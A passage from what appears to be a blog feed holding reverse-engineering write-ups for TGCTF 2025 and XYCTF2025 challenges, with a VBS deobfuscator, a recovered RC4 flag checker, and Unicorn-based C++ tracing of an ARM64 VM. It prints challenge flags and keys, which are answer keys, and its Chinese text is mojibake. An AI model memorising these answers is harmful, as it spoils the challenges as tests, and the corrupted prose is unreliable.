class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">decrypt</span>(Enc_flag, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.32s\n&quot;</span>, Enc_flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HZNUCTF{f898-de85-46e-9e43-b9c8}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TGCTF-2025-é€†å‘WP&quot;&gt;&lt;a href=&quot;#TGCTF-2025-é€†å‘WP&quot; class=&quot;headerlink&quot; title=&quot;TGCTF 2025 é€†å‘WP&quot;&gt;&lt;/a&gt;TGCTF 2025 é€†å‘WP&lt;/h1&gt;&lt;p&gt;æˆ˜é˜Ÿåï¼šä¸çŸ¥é“&lt;/p&gt;
&lt;p&gt;æ’åï¼š</summary>
      
    
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>XYCTF2025</title>
    <link href="https://tkazer.github.io/2025/04/07/XYCTF2025/"/>
    <id>https://tkazer.github.io/2025/04/07/XYCTF2025/</id>
    <published>2025-04-07T10:30:03.000Z</published>
    <updated>2025-04-22T10:39:58.695Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XYCTF2025-é€†å‘WP"><a href="#XYCTF2025-é€†å‘WP" class="headerlink" title="XYCTF2025 é€†å‘WP"></a>XYCTF2025 é€†å‘WP</h1><p>è™½ç„¶è¿™æ¬¡å¤±å»Webæ‰‹ï¼Œä½†æ˜¯é…åˆæ–°æ¥çš„å¸ˆå‚…ï¼Œå°é˜Ÿçš„é˜Ÿå‘˜ä»¬ä¹Ÿä¸€èµ·åŠªåŠ›æ‰“äº†ä¸é”™çš„æˆç»©ã€‚</p><p>å¢¨æ°´å¸ˆå‚…çš„MDriveré¢˜ä¹Ÿæ˜¯æ‹¼å°½å…¨åŠ›æ— æ³•æˆ˜èƒœï¼ˆï¼Œæ€»ä½“é€†å‘é¢˜çš„è´¨é‡æŒºä¸é”™çš„ï¼Œæ²¡ä»€ä¹ˆçƒ‚æ´»ï¼Œå€¼å¾—ä¸€è¯•ã€‚</p><h2 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h2><p>ç½‘ä¸ŠæŠ„çš„VBSè§£å¯†ä»£ç </p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Function</span> Defuscator(vbs)</span><br><span class="line">    <span class="keyword">Dim</span> t</span><br><span class="line">    t = InStr(<span class="number">1</span>, vbs, <span class="string">&quot;Execute&quot;</span>, <span class="number">1</span>)</span><br><span class="line">    t = <span class="keyword">Mid</span>(vbs, t + Len(<span class="string">&quot;Execute&quot;</span>))</span><br><span class="line">    t = Eval(t)</span><br><span class="line">    Defuscator = t</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Dim</span> fso, i, outFile</span><br><span class="line"><span class="keyword">Const</span> ForReading = <span class="number">1</span>, ForWriting = <span class="number">2</span></span><br><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">&#x27; åˆ›å»ºæˆ–æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶ç”¨äºå†™å…¥è¾“å‡º</span></span><br><span class="line">    <span class="keyword">Set</span> outFile = fso.OpenTextFile(<span class="string">&quot;output.txt&quot;</span>, ForWriting, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> WScript.Arguments.Count - <span class="number">1</span></span><br><span class="line">        <span class="keyword">Dim</span> FileName</span><br><span class="line">        FileName = WScript.Arguments(i)</span><br><span class="line">        <span class="keyword">Dim</span> MyFile</span><br><span class="line">        <span class="keyword">Set</span> MyFile = fso.OpenTextFile(FileName, ForReading)</span><br><span class="line">            <span class="keyword">Dim</span> vbs</span><br><span class="line">            vbs = MyFile.ReadAll</span><br><span class="line">            outFile.WriteLine Defuscator(vbs)</span><br><span class="line">            MyFile.Close</span><br><span class="line">        <span class="keyword">Next</span></span><br><span class="line"></span><br><span class="line">        outFile.Close</span><br><span class="line">        <span class="keyword">Set</span> fso = <span class="literal">Nothing</span></span><br></pre></td></tr></table></figure><p>output.txt:</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;Dear CTFER. Have fun in XYCTF 2025!&quot;</span></span><br><span class="line">flag = InputBox(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;XYCTF&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;90df4407ee093d309098d85a42be57a2979f1e51463a31e8d15e2fac4e84ea0df622a55c4ddfb535ef3e51e8b2528b826d5347e165912e99118333151273cc3fa8b2b3b413cf2bdb1e8c9c52865efc095a8dd89b3b3cfbb200bbadbf4a6cd4&quot;</span> <span class="comment">&#x27; æ£°å‹®î†•é¨å‡´C4é”çŠ²ç˜‘ç¼æ’´ç‰é”›å å´„éî…¡ç¹˜é’èˆµç‰¸å¯®å¿¥ç´š</span></span><br><span class="line">qwfe = <span class="string">&quot;rc4key&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; æ·‡î†¼î˜²éšåº£æ®‘RC4é”çŠ²ç˜‘é‘èŠ¥æšŸ</span></span><br><span class="line"><span class="keyword">Function</span> RunRC(sMessage, strKey)</span><br><span class="line">    <span class="keyword">Dim</span> kLen, i, j, temp, pos, outHex</span><br><span class="line">    <span class="keyword">Dim</span> s(<span class="number">255</span>), k(<span class="number">255</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; é’æ¿†îé–æ §ç˜‘é–½?</span></span><br><span class="line">    kLen = Len(strKey)</span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        s(i) = i</span><br><span class="line">        k(i) = Asc(<span class="keyword">Mid</span>(strKey, (i <span class="built_in">Mod</span> kLen) + <span class="number">1</span>, <span class="number">1</span>)) <span class="comment">&#x27; ç€µå—›æŒœæµ£è·¨æ•¤ASCIIç¼‚æ «çˆœ</span></span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; KSAç€µå—›æŒœç’‹å†¨å®³</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">0</span> <span class="keyword">To</span> <span class="number">255</span></span><br><span class="line">        j = (j + s(i) + k(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; PRGAé”çŠ²ç˜‘å¨´ä½ºâ–¼</span></span><br><span class="line">    i = <span class="number">0</span> : j = <span class="number">0</span> : outHex = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">For</span> pos = <span class="number">1</span> <span class="keyword">To</span> Len(sMessage)</span><br><span class="line">        i = (i + <span class="number">1</span>) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        j = (j + s(i)) <span class="built_in">Mod</span> <span class="number">256</span></span><br><span class="line">        temp = s(i)</span><br><span class="line">        s(i) = s(j)</span><br><span class="line">        s(j) = temp</span><br><span class="line">        </span><br><span class="line">        <span class="comment">&#x27; é”çŠ²ç˜‘éªæƒ°æµ†æ¶“å“„å´„éî…¡ç¹˜é’?</span></span><br><span class="line">        <span class="keyword">Dim</span> plainChar, cipherByte</span><br><span class="line">        plainChar = Asc(<span class="keyword">Mid</span>(sMessage, pos, <span class="number">1</span>)) <span class="comment">&#x27; é„åº¢æƒé¸å ¿SCIIæ¾¶å‹­æ‚Š</span></span><br><span class="line">        cipherByte = s((s(i) + s(j)) <span class="built_in">Mod</span> <span class="number">256</span>) <span class="built_in">Xor</span> plainChar</span><br><span class="line">        outHex = outHex &amp; Right(<span class="string">&quot;0&quot;</span> &amp; Hex(cipherByte), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">Next</span></span><br><span class="line">    </span><br><span class="line">    RunRC = outHex</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&#x27; æ¶“å©šç™ç’‡ä¾€â‚¬æ˜ç·«</span></span><br><span class="line"><span class="keyword">If</span> LCase(RunRC(flag, qwfe)) = LCase(wefbuwiue) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>RC4è§£å¯†ï¼Œå¯†é’¥ä¸º<strong>rc4key</strong></p><p><img src="/2025/04/07/XYCTF2025/1.png"></p><p>flag{We1c0me_t0_XYCTF_2025_reverse_ch@lleng3_by_th3_w@y_p3cd0wnâ€˜s_chall_is_r3@lly_gr3@t_&amp;_fuN!}</p><h2 id="ezVM"><a href="#ezVM" class="headerlink" title="ezVM"></a>ezVM</h2><p>é€šè¿‡å­—ç¬¦ä¸²ç•Œé¢é‡Œçš„unicornå’ŒåŠ å¯†å‡½æ•°çš„ä¸€äº›ç‰¹å¾å‘ç°æ˜¯ä½¿ç”¨äº†unicornæ¡†æ¶è°ƒç”¨äº†ä¸€ä¸²ä»£ç ã€‚</p><p>æ‰¾ä¸€ä¸ªä½¿ç”¨unicornæ¡†æ¶çš„ç¨‹åºè¿›è¡Œbindiffæ¢å¤ä¸€äº›unicornå‡½æ•°çš„ç¬¦å·ã€‚</p><p>å‘ç°æ˜¯è°ƒç”¨äº†ä¸€ä¸²ARM64çš„ä»£ç å­—èŠ‚è¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œï¼Œå°†è¾“å…¥å­—ç¬¦ä¸²ä¼ å…¥åŠ å¯†è¿”å›ï¼Œå¹¶é™„ä¸Šäº†ä¸€äº›dataå’Œæ ˆç©ºé—´åˆå§‹åŒ–ã€‚</p><p><img src="/2025/04/07/XYCTF2025/2.png"></p><p><img src="/2025/04/07/XYCTF2025/4.png"></p><p>å°†ä»¥ä¸Šè°ƒç”¨writeå†™å…¥çš„æ•°æ®æå–ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªARM64æ¡†æ¶çš„.soå¤åˆ¶åˆ°å¯¹åº”åœ°å€ï¼Œä»¥ä¾¿åç¼–è¯‘çœ‹ä»£ç ã€‚</p><p>æœ€åå¾—åˆ°ä¸€ä¸ªå‡½æ•°ï¼Œå¾ˆæ¸…æ™°çš„çœ‹å‡ºé‡Œé¢æ˜¯ä¸€ä¸ªVMè™šæ‹Ÿæœºæ‰§è¡Œçš„æµç¨‹ã€‚</p><p><img src="/2025/04/07/XYCTF2025/5.png"></p><p>ä½¿ç”¨c++ç¼–å†™ä»£ç è°ƒç”¨unicornåº“è¿›è¡Œæ¨¡æ‹Ÿã€‚</p><p>ä½¿ç”¨Hookï¼Œåœ¨å…³é”®è®¡ç®—åœ°å€å¤„è¿›è¡ŒHookï¼Œè¾“å‡ºå„ä¸ªè®¡ç®—æµç¨‹ä»¥åŠæ•°æ®ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;data.hpp&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unicorn/unicorn.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib,<span class="string">&quot;unicorn-import.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hook_code</span><span class="params">(uc_engine* uc, <span class="type">uint64_t</span> address, <span class="type">uint32_t</span> size, <span class="type">void</span>* user_data)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint64_t</span> w0,w1,w2,w3,w4;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1fac</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 ^ W0 --- %llx ^ %llx = %llx\n&quot;</span>, w1,w0,w1^w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2BE4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 &gt;&gt; W0 --- %llx &gt;&gt; %llx = %llx\n&quot;</span>, w1, w0, w1 &gt;&gt; w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2DB4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W3 = W1 &lt;&lt; W0 --- %llx &lt;&lt; %llx = %llx\n&quot;</span>, w1, w0, w1 &lt;&lt; w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x232C</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 &amp; W3 --- %llx &amp; %llx = %llx\n&quot;</span>, w0, w3, w0 &amp; w3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2054</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n&quot;</span>, w0, w3, w3 ^ w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2238</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W3, &amp;w3);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W0 ^ W3 --- %llx ^ %llx = %llx\n&quot;</span>, w0, w3, w3 ^ w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x2180</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W4, &amp;w4);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W1 = W1 ^ W4 --- %llx ^ %llx = %llx\n&quot;</span>, w1, w4, w1 ^ w4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1CC4</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W1 + W0 --- %llx + %llx = %llx\n&quot;</span>, w1, w0, w1 + w0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (address == <span class="number">0x1A0C</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W0, &amp;w0);</span><br><span class="line">        <span class="built_in">uc_reg_read</span>(uc, UC_ARM64_REG_W1, &amp;w1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;W2 = W1 + W0 --- %llx + %llx = %llx\n&quot;</span>, w1, w0, w1 + w0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint8_t</span> Input[] = <span class="string">&quot;11112222111111111111111111111111&quot;</span>;</span><br><span class="line">    uc_engine* uc&#123;&#125;;</span><br><span class="line">    uc_hook hook;</span><br><span class="line">    <span class="type">uint64_t</span> InputAddr = <span class="number">0x14C28</span>;</span><br><span class="line">    <span class="type">uint64_t</span> Stack = <span class="number">0x7F0000</span>;</span><br><span class="line">    <span class="type">uint8_t</span> MyEncFlag[<span class="number">100</span>]&#123;&#125;;</span><br><span class="line">    <span class="type">uint64_t</span> Base = <span class="number">0x0000000001000000</span>;</span><br><span class="line">    <span class="built_in">uc_open</span>(uc_arch::UC_ARCH_ARM64, uc_mode::UC_MODE_ARM, &amp;uc);</span><br><span class="line">    <span class="built_in">uc_mem_map</span>(uc, <span class="number">0</span>, Base, UC_PROT_ALL);</span><br><span class="line">    <span class="built_in">uc_mem_map</span>(uc, Stack - <span class="number">4096</span>, <span class="number">0x4000</span>, UC_PROT_ALL);</span><br><span class="line">    <span class="built_in">uc_hook_add</span>(uc, &amp;hook, UC_HOOK_CODE, hook_code, <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x14C28</span>, (LPVOID)&amp;Input, <span class="number">0x20u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x0C70</span>, (LPVOID)&amp;Code, <span class="number">8840u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x14010</span>, (LPVOID)Data1, <span class="number">0x9B8u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x30F0</span>, (LPVOID)&amp;Data2, <span class="number">0x54u</span>);</span><br><span class="line">    <span class="built_in">uc_mem_write</span>(uc, <span class="number">0x149E8</span>, (LPVOID)&amp;Data3, <span class="number">8u</span>);</span><br><span class="line">    <span class="built_in">uc_reg_write</span>(uc, <span class="number">0xC7</span>, (LPVOID)&amp;InputAddr);<span class="comment">// X0</span></span><br><span class="line">    <span class="built_in">uc_reg_write</span>(uc, <span class="number">4</span>, (LPVOID)&amp;Stack);       <span class="comment">// SP</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">uc_emu_start</span>(uc, <span class="number">0x0C70</span>, <span class="number">0x2EF4</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">uc_mem_read</span>(uc, InputAddr, &amp;MyEncFlag, <span class="number">48</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%X &quot;</span>, MyEncFlag[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">uc_close</span>(uc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åè¿è¡Œè¾“å‡ºå¾—åˆ°ä¸€ä¸ªvmåŠ å¯†æµç¨‹</p><p>ä»¥ä¸‹æ˜¯éƒ¨åˆ†è¾“å‡ºå†…å®¹ã€‚</p><p>output:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4</span> &lt;&lt; <span class="number">0</span> = <span class="number">4</span></span><br><span class="line">W3 = W1 &lt;&lt; W0 --- <span class="number">4</span> &lt;&lt; <span class="number">1</span> = <span class="number">8</span></span><br><span class="line">W3 = W1 &gt;&gt; W0 